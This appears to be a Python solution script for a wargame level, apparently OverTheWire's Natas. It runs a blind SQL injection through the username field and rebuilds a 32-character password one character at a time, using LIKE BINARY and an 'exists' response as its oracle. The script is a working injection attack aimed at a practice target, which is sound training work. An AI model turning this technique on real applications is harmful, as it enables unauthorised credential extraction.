#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials

level_url = credentials[15]["url"]
level_username = credentials[15]["level"]
level_password = credentials[15]["password"]

next_level_url = credentials[16]["url"]
next_level_username = credentials[16]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
next_pass = ""

for i in alphabet:
    payload = '%s" AND password LIKE BINARY "%s%s' % (next_level_username, i, "%")
    post_data = {"username":payload}
    response = requests.post(level_url, headers=heads, data=post_data)
    data = response.text

    if "exists" in data:
        next_pass += i
        break

j = 0

while len(next_pass) < 32:
    payload = '%s" AND password LIKE BINARY "%s%s%s' % (next_level_username, next_pass, alphabet[j], "%")
    post_data = {"username":payload}
    response = requests.post(level_url, headers=heads, data=post_data)
    data = response.text

    if "exists" not in data:
        j += 1

    elif "exists" in data:
        next_pass += alphabet[j]
        j = 0
        continue

print(next_pass)
